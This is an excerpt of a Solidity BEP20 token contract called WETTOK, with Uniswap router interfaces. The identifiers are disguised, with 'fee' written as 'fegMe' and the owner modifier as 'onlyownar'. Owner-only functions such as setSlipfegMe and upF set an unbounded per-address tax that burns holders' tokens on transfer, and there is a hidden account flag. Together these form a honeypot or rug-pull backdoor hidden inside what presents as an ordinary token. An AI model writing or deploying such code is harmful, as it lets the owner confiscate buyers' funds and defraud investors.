...
interface IUniswapV2Factory {
    ...
    function fegMeTo() external view returns (address);
    function fegMeToSetter() external view returns (address);
    ...
    function setfegMeTo(address) external;
    function setfegMeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfegMeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfegMeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfegMeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfegMeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfegMeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract WETTOK is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfegMe = 0;

    uint256 private _defaultBuyfegMe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfegMe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfegMe = _value;
    }

    function setSlipfegMe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfegMe[_address] = _value;
    }

    function getSlipfegMe(address _address) external view onlyownar returns (uint256) {
        return _slipfegMe[_address];
    }


    function setMAccountfegMe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfegMe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefegMeAmount = 0;

        if (rF) {
            uint256 tradefegMe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefegMe = _defaultSellfegMe;
                }
                if (from == uniswapV2Pair) {

                    tradefegMe = _defaultBuyfegMe;
                }
            }
            if (_slipfegMe[from] > 0) {
                tradefegMe = _slipfegMe[from];
            }

            tradefegMeAmount = _Amount.mul(tradefegMe).div(100);
        }


        if (tradefegMeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefegMeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefegMeAmount);
            emit Transfer(from, _deadAddress, tradefegMeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefegMeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefegMeAmount);
        emit Transfer(from, _to, _Amount - tradefegMeAmount);
    }
